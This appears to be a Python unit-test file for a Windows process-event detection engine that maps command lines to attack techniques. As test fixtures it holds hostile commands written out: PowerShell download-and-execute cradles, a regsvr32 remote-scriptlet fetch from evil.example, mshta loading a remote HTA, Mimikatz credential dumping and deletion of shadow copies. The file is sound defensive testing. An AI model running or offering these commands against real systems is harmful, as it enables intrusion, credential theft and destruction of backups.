import base64, gzip, time, unittest
from aegis_mitre import analyze_process, ProcessTracker


def ev(cmd, image="C:\\Windows\\System32\\cmd.exe", parent="C:\\Windows\\explorer.exe", **kw):
    p = {"event_id": "1", "command_line": cmd, "image": image, "parent_image": parent}
    p.update(kw)
    return {"host": "h1", "parsed": p}


def enc(s):
    return base64.b64encode(s.encode("utf-16-le")).decode()


PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def ids(r):
    return {d["rule_id"] for d in r["detections"] if not d.get("suppressed_by_triage")}


class T(unittest.TestCase):
    def test_non_event1(self):
        self.assertFalse(analyze_process({"parsed": {"event_id": "3"}})["analyzed"])

    def test_backcompat_lab_command(self):
        r = analyze_process(ev(f"powershell.exe -enc {enc('Write-Output \"SYSMON-SOC-TEST-2026\"')}", PS))
        self.assertEqual(r["triage"], "known_benign_lab_test")
        self.assertEqual((r["risk_score"], r["verdict"]), (5, "low"))

    def test_lab_allowlist_does_not_hide_other_findings(self):
        r = analyze_process(ev(f"powershell.exe -w hidden -enc {enc('Write-Output \"SYSMON-SOC-TEST-2026\"')} ; mshta http://1.2.3.4/a.hta", PS))
        self.assertIn("AEGIS-LOL-003", ids(r))
        self.assertGreaterEqual(r["risk_score"], 70)

    def test_enc_abbreviations_and_unicode_dash(self):
        for flag in ("-e", "-ec", "-EncodedC", "\u2013enc", "/enc"):
            r = analyze_process(ev(f"powershell {flag} {enc('whoami')}", PS))
            self.assertIn("AEGIS-PS-001", ids(r), flag)

    def test_enc_not_flagged_for_other_tools(self):
        r = analyze_process(ev("curl.exe -e http://ref.example/ http://x.example/", "C:\\Windows\\System32\\curl.exe"))
        self.assertNotIn("AEGIS-PS-001", ids(r))

    def test_decoded_content_is_scanned(self):
        payload = "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')"
        r = analyze_process(ev(f"powershell -nop -w hidden -enc {enc(payload)}", PS))
        self.assertIn("AEGIS-PS-010", ids(r))
        self.assertIn("http://10.0.0.5/a.ps1", r["iocs"]["urls"][0])
        self.assertGreaterEqual(r["risk_score"], 85)
        self.assertEqual(r["verdict"], "critical")

    def test_gzip_nested_payload(self):
        inner = gzip.compress("Invoke-Mimikatz -DumpCreds".encode())
        script = f"[Convert]::FromBase64String('{base64.b64encode(inner).decode()}')"
        r = analyze_process(ev(f"powershell -enc {enc(script)}", PS))
        self.assertIn("AEGIS-CRED-001", ids(r))
        self.assertIn("AEGIS-HEUR-009", ids(r))

    def test_zip_bomb_is_bounded(self):
        bomb = base64.b64encode(gzip.compress(b"A" * 50_000_000)).decode()
        t = time.time()
        r = analyze_process(ev(f"powershell -c [Convert]::FromBase64String('{bomb}')", PS))
        self.assertLess(time.time() - t, 3)
        self.assertTrue(r["analyzed"])

    def test_cmd_caret_and_quote_obfuscation(self):
        r = analyze_process(ev('r"und"ll32 ja^vascript:"\\..\\mshtml,RunHTMLApplication"', "C:\\Windows\\System32\\rundll32.exe"))
        self.assertIn("AEGIS-LOL-001", ids(r))

    def test_concat_obfuscation(self):
        r = analyze_process(ev("cmd /c \"pow\"+\"ersh\"+\"ell\"+\"-c\"+\"x\" ", ))
        self.assertIn("AEGIS-HEUR-003", ids(r))

    def test_regsvr32_squiblydoo(self):
        r = analyze_process(ev("regsvr32 /s /n /u /i:http://evil.example/x.sct scrobj.dll", "C:\\Windows\\System32\\regsvr32.exe"))
        self.assertIn("AEGIS-LOL-002", ids(r))

    def test_office_child(self):
        r = analyze_process(ev("cmd.exe /c whoami", parent="C:\\Program Files\\Microsoft Office\\winword.exe"))
        self.assertIn("AEGIS-CTX-001", ids(r))

    def test_webshell(self):
        r = analyze_process(ev("cmd.exe /c whoami", parent="C:\\Windows\\System32\\inetsrv\\w3wp.exe"))
        self.assertIn("AEGIS-CTX-002", ids(r))

    def test_masquerading(self):
        r = analyze_process(ev("svchost.exe -k x", "C:\\Users\\Public\\svchost.exe", "C:\\Windows\\System32\\services.exe"))
        self.assertIn("AEGIS-MASQ-001", ids(r))
        r = analyze_process(ev("lsass.exe", "C:\\Windows\\System32\\lsass.exe", "C:\\Windows\\System32\\cmd.exe"))
        self.assertIn("AEGIS-MASQ-002", ids(r))

    def test_renamed_binary(self):
        r = analyze_process(ev("x.exe /c calc", "C:\\Users\\a\\Downloads\\x.exe", OriginalFileName="Cmd.Exe"))
        self.assertIn("AEGIS-MASQ-003", ids(r))

    def test_ransomware_prep(self):
        r = analyze_process(ev("vssadmin.exe delete shadows /all /quiet", "C:\\Windows\\System32\\vssadmin.exe"))
        self.assertEqual(r["verdict"], "critical")

    def test_benign_commands_stay_quiet(self):
        for c, i in (("C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule", "C:\\Windows\\System32\\svchost.exe"),
                     ("ping 8.8.8.8", "C:\\Windows\\System32\\PING.EXE"),
                     ("ipconfig /all", "C:\\Windows\\System32\\ipconfig.exe")):
            r = analyze_process(ev(c, i, "C:\\Windows\\System32\\services.exe"))
            self.assertLess(r["risk_score"], 40, c)

    def test_schtasks_payload(self):
        r = analyze_process(ev("schtasks /create /tn u /tr \"powershell -nop -c x\" /sc onlogon", "C:\\Windows\\System32\\schtasks.exe"))
        self.assertIn("AEGIS-TASK-002", ids(r))

    def test_redos_resilience(self):
        t = time.time()
        analyze_process(ev("rundll32 " + "a " * 15000))
        analyze_process(ev("powershell " + "iex " * 8000, PS))
        self.assertLess(time.time() - t, 3)

    def test_fails_loud(self):
        r = analyze_process({"parsed": {"event_id": "1", "command_line": object()}})
        self.assertIn(r["verdict"], ("none", "low", "medium", "high", "critical", "error"))

    def test_process_tree_chain(self):
        tr = ProcessTracker()
        mk = lambda g, pg, img, cmd, **k: {"host": "h", "parsed": {"event_id": 1, "process_guid": g,
              "parent_process_guid": pg, "image": img, "command_line": cmd, **k}}
        tr.analyze(mk("A", "0", "C:\\Office\\WINWORD.EXE", "winword.exe x.docm", parent_image="C:\\Windows\\explorer.exe"))
        tr.analyze(mk("B", "A", "C:\\Windows\\System32\\cmd.exe", "cmd /c x", parent_image="C:\\Office\\WINWORD.EXE"))
        r = tr.analyze(mk("C", "B", PS, "powershell -nop -c x", parent_image="C:\\Windows\\System32\\cmd.exe"))
        self.assertIn("AEGIS-CHAIN-002", ids(r))
        self.assertEqual(len(r["lineage"]), 2)


if __name__ == "__main__":
    unittest.main()
